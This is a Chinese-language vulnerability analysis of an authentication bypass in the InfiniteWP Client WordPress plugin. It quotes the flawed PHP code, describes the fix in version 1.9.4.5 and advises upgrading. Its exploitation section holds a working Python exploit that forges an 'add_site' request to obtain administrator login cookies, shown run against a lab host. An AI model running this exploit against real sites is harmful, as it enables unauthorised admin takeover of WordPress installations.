##  **前言**

 **InfiniteWP Client是一个WordPress插件，当它与InfiniteWP Admin
Panel结合使用时，可以方便快捷地集中管理多个WordPress站点。InfiniteWP Client
<=1.9.4.4的版本被曝出了一个身份认证绕过漏洞。目前InfiniteWP
Client安装在30多万个WordPress站点上，因此该漏洞的影响面非常广。本文详细分析了该漏洞，并且对其进行了利用。**

##  **实验环境**

> 1.测试工具：BurpSuite v2.1
>
> 2.目标主机：Debian9.6 x64
>
> 3.软件版本：WordPress 5.2.2
>
> 4.插件版本：iwp-client.1.9.4.4

##  **漏洞分析**

1.问题主要出在函数iwp_mmb_set_request()中，该函数检查IWP_MMB_Core类的request_params变量是否为空。若$iwp_mmb_core->request_params的值为空，则返回false；若不为空，则后续会判断变量$params['username']是否已设置并且该用户是否已登录，如果$params['username']已设置且该用户未登录，那么接下来使用iwp_mmb_get_user_by函数获取用户信息，然后使用wp_set_auth_cookie为给定的$params['username']设置登录cookie。但是$params['username']的值从何而来?在以下代码中，我们看到$params
= $iwp_mmb_core->request_params这条语句。

    
    
    if (!function_exists ('iwp_mmb_set_request')) {
    	function iwp_mmb_set_request(){
    		global $current_user, $iwp_mmb_core, $new_actions, $wp_db_version, $wpmu_version, $_wp_using_ext_object_cache, $iwp_mmb_activities_log;
    		if (is_user_logged_in()) {
    			iwp_plugin_compatibility_fix();
    		}
    		if (empty($iwp_mmb_core->request_params)) {
    			return false;
    		}
    		$params = $iwp_mmb_core->request_params;
    		$action = $iwp_mmb_core->request_params['iwp_action'];
    		$is_save_activity_log  = $iwp_mmb_core->request_params['is_save_activity_log'];
    		if ($action == 'maintain_site') {
    			iwp_mmb_maintain_site($params);
    			iwp_mmb_response(array('error' => 'You should never see this.', 'error_code' => 'you_should_never_see_this'), false);
    		}
    		@ignore_user_abort(true);
    		$GLOBALS['IWP_CLIENT_HISTORY_ID'] = $iwp_mmb_core->request_params['id'];
    		iwp_mmb_backup_db_changes();
    		if(isset($params['username']) && !is_user_logged_in()){
    			$user = function_exists('get_user_by') ? get_user_by('login', $params['username']) : iwp_mmb_get_user_by( 'login', $params['username'] );
    			if (isset($user) && isset($user->ID)) {
    				wp_set_current_user($user->ID);
    				update_user_meta($user->ID, 'last_login_time', current_time('mysql'));
    			}
    			$isHTTPS = (bool)is_ssl();
    			if($isHTTPS){
    				wp_set_auth_cookie($user->ID);
    			}else{
    				wp_set_auth_cookie($user->ID, false, false);
    				wp_set_auth_cookie($user->ID, false, true);
    			}
    		}

2.$iwp_mmb_core->request_params的值又是从何而来？追溯$iwp_mmb_core->request_params，找到一个名为iwp_mmb_parse_request()的函数。这个函数在init.php的末尾被调用，代码具体如下：

    
    
    if( !function_exists ('iwp_mmb_parse_request')) {
    	function iwp_mmb_parse_request()
    	{
    		global $HTTP_RAW_POST_DATA, $iwp_mmb_activities_log;
    		$HTTP_RAW_POST_DATA_LOCAL = NULL;
    		$HTTP_RAW_POST_DATA_LOCAL = file_get_contents('php://input');
    		if(empty($HTTP_RAW_POST_DATA_LOCAL)){
    			if (isset($HTTP_RAW_POST_DATA)) {
    				$HTTP_RAW_POST_DATA_LOCAL = $HTTP_RAW_POST_DATA;
    			}
    		}
    			
    		global $current_user, $iwp_mmb_core, $new_actions, $wp_db_version, $wpmu_version, $_wp_using_ext_object_cache;
    		if (strrpos($HTTP_RAW_POST_DATA_LOCAL, '_IWP_JSON_PREFIX_') !== false) {
    			$request_data_array = explode('_IWP_JSON_PREFIX_', $HTTP_RAW_POST_DATA_LOCAL);
    			$request_raw_data = $request_data_array[1];
    			$data = trim(base64_decode($request_raw_data));
    			$GLOBALS['IWP_JSON_COMMUNICATION'] = 1;
    		}else{
    			$data = false;
    			$request_raw_data = $HTTP_RAW_POST_DATA_LOCAL;
    			$serialized_data = trim(base64_decode($request_raw_data));
    			if (is_serialized($serialized_data)) {
    					iwp_mmb_response(array('error' => 'Please update your IWP Admin Panel to latest version', 'error_code' => 'update_panel'), false, true);
    			}
    		}
    		
    		if ($data){
    			$request_data = json_decode($data, true);
    			if(isset($request_data['params'])){ 
    				$request_data['params'] = iwp_mmb_filter_params($request_data['params']);
    			}
    			if (isset($GLOBALS['IWP_JSON_COMMUNICATION']) && $GLOBALS['IWP_JSON_COMMUNICATION']) {
    				$signature  = base64_decode($request_data['signature']);
    			}else{
    				$signature  = $request_data['signature'];
    			}
    			$iwp_action 					= $request_data['iwp_action'];
    			$params 						= $request_data['params'];
    			$id 							= $request_data['id'];
    			if(isset($request_data['is_save_activity_log'])) {
    				$is_save_activity_log	= $request_data['is_save_activity_log'];
    			}
    			$GLOBALS['activities_log_datetime'] = $request_data['activities_log_datetime'];
    		}
    		if (isset($iwp_action) && $iwp_action != 'restoreNew') {
    			if(!defined('IWP_AUTHORISED_CALL')) define('IWP_AUTHORISED_CALL', 1);
    			if(function_exists('register_shutdown_function')){ register_shutdown_function("iwp_mmb_shutdown"); }
    			$GLOBALS['IWP_MMB_PROFILING']['ACTION_START'] = microtime(1);
    		
    			error_reporting(0);
    			@ini_set("display_errors", 0);
    					
    			run_hash_change_process();
    			iwp_plugin_compatibility_fix();
    			$action = $iwp_action;
    			$_wp_using_ext_object_cache = false;
    			@set_time_limit(600);
    			
    			if (!$iwp_mmb_core->check_if_user_exists($params['username']))
    				iwp_mmb_response(array('error' => 'Username ' . $params['username'] . ' does not have administrative access. Enter the correct username in the site options.', 'error_code' => 'username_does_not_have_administrative_access'), false);
    			
    			if ($action == 'add_site') {
    				$params['iwp_action'] = $action;
    				$iwp_mmb_core->request_params = $params;
    				return;
    			}elseif ($action == 'readd_site') {
    				$params['id'] = $id;
    				$params['iwp_action'] = $action;
    				$params['signature'] = $signature;
    				$iwp_mmb_core->request_params = $params;
    				return;
    			}
    			
    			$auth = $iwp_mmb_core->authenticate_message($action . $id, $signature, $id);
    			if ($auth === true) {
    				if (!defined('WP_ADMIN') && $action == 'get_stats' || $action == 'do_upgrade' || $action == 'install_addon' || $action == 'edit_plugins_themes' || $action == 'bulk_actions_processor' || $action == 'update_broken_link' || $action == 'undismiss_broken_link') {
    					define('WP_ADMIN', true);
    				}
    				if ($action == 'get_stats') {
    					iwp_mu_plugin_loader();
    				}
    				if (is_multisite()) {
    					define('WP_NETWORK_ADMIN', true);
    				}else{
    					define('WP_NETWORK_ADMIN', false);
    				}
    				$params['id'] = $id;
    				$params['iwp_action'] = $action;
    				$params['is_save_activity_log'] = $is_save_activity_log;
    				$iwp_mmb_core->request_params = $params;
    			} else {
    				iwp_mmb_response($auth, false);
    			}
    		} else {
                $HTTP_RAW_POST_DATA =  $HTTP_RAW_POST_DATA_LOCAL;
    		}
    		
    	}
    }

3.我们注意到add_site和readd_site这两个操作，当变量$action为add_site或者readd_site时，直接对$iwp_mmb_core->request_params进行了赋值，并且进行了return，后续的$iwp_mmb_core->authenticate_message($action
. $id, $signature, $id)安全检查也就不会执行了，因此问题就出在add_site和readd_site这两个动作上。

##  **漏洞利用**

1.进一步分析函数iwp_mmb_parse_request()中的如下代码：

    
    
    if (strrpos($HTTP_RAW_POST_DATA_LOCAL, '_IWP_JSON_PREFIX_') !== false) {
    			$request_data_array = explode('_IWP_JSON_PREFIX_', $HTTP_RAW_POST_DATA_LOCAL);
    			$request_raw_data = $request_data_array[1];
    			$data = trim(base64_decode($request_raw_data));
    			$GLOBALS['IWP_JSON_COMMUNICATION'] = 1;
    		}else{
    			$data = false;
    			$request_raw_data = $HTTP_RAW_POST_DATA_LOCAL;
    			$serialized_data = trim(base64_decode($request_raw_data));
    			if (is_serialized($serialized_data)) {
    					iwp_mmb_response(array('error' => 'Please update your IWP Admin Panel to latest version', 'error_code' => 'update_panel'), false, true);
    			}
    		}
    		
    		if ($data){
    			$request_data = json_decode($data, true);

从上面的代码可以看出，函数iwp_mmb_parse_request()先对$request_raw_data进行了base64解码并将其赋值给$data，然后又对$data进行了json解码。因此，要使恶意请求能够生效，首先必须使用json对负载进行编码，再使用Base64编码，然后在POST请求中将其发送给WordPress。

2.这里写了一个漏洞利用程序，具体代码如下：

    
    
    # -*- coding: UTF-8 -*-    import requests
    import base64
    import json
    def exploit(url, username):
        json_info = {"iwp_action": "add_site", "params": {"username": username}}
        try:
            return requests.post(url, timeout=5, verify=False,
                headers={"User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0"},
                data="_IWP_JSON_PREFIX_{}".format(base64.b64encode(json.dumps(json_info).encode("utf-8")).decode("utf-8"))
            )
        except Exception as e:
            print("[-] HTTP Exploit Error: {}".format(e))
        return False
    if __name__ == "__main__":
        url = raw_input("[+] 请输入url：")
        username = raw_input("[+] 请输入用户名：")
        site_response = exploit(url, username)
        cookie = ""
        if (site_response and site_response.status_code == requests.codes.ok):
            list = [str(a)+"="+str(b) for a, b in site_response.cookies.items()]
            cookie = "; ".join(list)
        if cookie:
                print("[+] 使用以下Cookies登录：\n{}".format(cookie))
                exit(0)
    print("[-] 漏洞利用失败！")

运行上述代码，其中的参数url输入：

    
    
    http://192.168.110.145/wordpress/wp-admin/

参数用户名输入：admin，在本例中WordPress的管理员用户名为admin，在实际操作中可能需要多次测试才能够得到正确的用户名。运行代码最终获得用于登录的Cookie值。![](https://image.3001.net/images/20200402/1585756907_5e84baeb96377.png!small)

在浏览器中输入url：

    
    
    http://192.168.110.145/wordpress/wp-admin/

使用Burpsuite截断代理，使用前面获取到的Cookie值替换截获到的数据包中的Cookie值，如下图所示：

![](https://image.3001.net/images/20200402/1585757016_5e84bb58e4c7d.png!small)![](https://image.3001.net/images/20200402/1585757022_5e84bb5ec58c6.png!small)如下图所示，可以看到登录WordPress管理后台成功。![](https://image.3001.net/images/20200402/1585757035_5e84bb6baaa3e.png!small)

##  **漏洞修复**

该漏洞在1.9.4.5版本中得到修复，代码具体如下：

    
    
    if ($action == 'add_site' || $action == 'readd_site') {
    			return false;
    		}
    		if ($action == 'maintain_site') {
    			iwp_mmb_maintain_site($params);
    			iwp_mmb_response(array('error' => 'You should never see this.', 'error_code' => 'you_should_never_see_this'), false);
    		}
    		@ignore_user_abort(true);
    		$GLOBALS['IWP_CLIENT_HISTORY_ID'] = $iwp_mmb_core->request_params['id'];
    		iwp_mmb_backup_db_changes();
    		if(isset($params['username']) && !is_user_logged_in()){
    			$user = function_exists('get_user_by') ? get_user_by('login', $params['username']) : iwp_mmb_get_user_by( 'login', $params['username'] );
    			if (isset($user) && isset($user->ID)) {
    				wp_set_current_user($user->ID);
    				// Compatibility with All In One Security
    				update_user_meta($user->ID, 'last_login_time', current_time('mysql'));
    			}
    			$isHTTPS = (bool)is_ssl();
    			if($isHTTPS){
    				wp_set_auth_cookie($user->ID);
    			}else{
    				wp_set_auth_cookie($user->ID, false, false);
    				wp_set_auth_cookie($user->ID, false, true);
    			}
    		}

主要是针对变量$action增加了一个条件判断，当$action为add_site或者readd_site时，函数直接返回false，这样就不涉及后续使用wp_set_auth_cookie来给$params['username']设置Cookie，漏洞也就得以修复。

##  **总结**

本文中的身份认证绕过漏洞是由代码中的逻辑错误造成的，而且恶意流量与正常流量并无明显差别，通过waf设备也很难进行防御，建议将插件InfiniteWP
Client升级到最新版本。

 ***本文作者：Neroqi，转载请注明来自FreeBuf.COM**

